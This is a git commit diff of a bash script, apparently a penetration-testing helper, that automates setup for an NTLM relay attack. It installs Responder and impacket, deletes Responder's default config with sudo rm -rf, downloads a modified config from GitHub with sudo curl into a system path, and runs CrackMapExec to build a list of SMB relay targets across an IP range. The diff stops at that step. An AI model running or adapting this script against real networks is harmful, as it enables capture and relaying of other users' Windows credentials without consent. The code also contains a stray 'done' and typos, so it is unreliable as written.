8ea5e2087ba53f21e516a1f0dfb762a5f9a14cc9
B0rk <26283277+B0rk@users.noreply.github.com>
2023-05-10 00:32:41 -0600

    Revision after checking
    Fixed dependency check, Added Colors. Still need to fix requiring options...

--- Auto-Relay.sh
+++ Auto-Relay.sh
@@ -1,65 +1,74 @@
 #!/bin/bash
 
-#Installing dependencies if not already installed
-echo "[+] Checking for application dependencies."
-if command -v terminator &> /dev/null
-then
-    echo "[+] Terminator is installed."
-else
-echo "[+] Installing Terminator."
-sudo apt update && sudo apt install terminator -y
-fi
-if command -v responder &> /dev/null
-then
-    echo "[+] Responder is installed."
-else
-echo "[+] Installing Responder."
-sudo apt update && sudo apt install responder -y
-fi
-if command -v impacket-scripts &> /dev/null
-then
-    echo "[+] Impacket-Scripts is installed."
-else
-echo "[+] Installing Impacket-Scrpits."
-sudo apt update && sudo apt install impacket-scripts -y
-fi
-done
+# some quick colors
+RED="\033[1;31m"
+BLUE="\033[1;34m"
+BLUE2="\033[0;34m"
+RESET="\033[0m"
+BOLD="\e[1m"
 
 #Options
 while getopts 'r:h' opt; do
   case "$opt" in
     r)
       range="$OPTARG"
-      echo -e "[+] IP Range is set to '$range'"
+      echo -e "[${BLUE}+${RESET}] IP Range is set to '$range'"
       ;;
 
     h)
-      echo -e "[!] Usage: $(basename $0) -r 10.10.10.0/24"
+      echo -e "[${RED}!${RESET}] Usage: $(basename $0) -r 10.10.10.0/24"
       echo -e "              -h:  print this help dialog"
       echo -e "              -r:  specify IP Range (Required)"
       exit 0
       ;;
 
     :)
-      echo -e "[!] Option requires an argument.\n\n    For usage, use $(basename $0) -h"
+      echo -e "[${RED}!${RESET}] Option requires an argument.\n\n    For usage, use $(basename $0) -h"
       exit 1
       ;;
 
     ?)
-      echo -e "[!]] For usage, use $(basename $0) -h"
+      echo -e "[${RED}!${RESET}] For usage, use $(basename $0) -h"
       exit 1
       ;;
   esac
 done
 
+#Installing dependencies if not already installed
+echo "[${BLUE}+${RESET}] Checking for application dependencies."
+if command -v terminator &> /dev/null
+then
+    echo -e "[${BLUE}+${RESET}] Terminator is installed."
+else
+echo -e "[${RED}!${RESET}] Installing Terminator."
+sudo apt update && sudo apt install terminator -y
+fi
+if command -v responder &> /dev/null
+then
+    echo -e "[${BLUE}+${RESET}] Responder is installed."
+else
+echo -e "[${RED}!${RESET}] Installing Responder."
+sudo apt update && sudo apt install responder -y
+fi
+if command -v impacket-ntlmrelayx &> /dev/null
+then
+    echo -e "[${BLUE}+${RESET}] Impacket-Scripts is installed."
+else
+echo -e "[${RED}!${RESET}] Installing Impacket-Scrpits."
+sudo apt update && sudo apt install impacket-scripts -y
+fi
+done
+
 #Removing original Responder Config File
+echo -e "[${BLUE}+${RESET}] Removing default Responder config file."
 sudo rm -rf /usr/share/responder/Responder.conf
 
 #Downloading Modified Responder Config File
+echo -e "[${BLUE}+${RESET}] Downloading modified Responder config file"
 sudo curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf
 
 #Sleep to allow for removal and downloading to complete.
-sleep 10
+sleep 5
 
 #Running CrackMapExec to create a relay list
 crackmapexec smb ${range} --gen-relay-list ~/relay_targets.txt
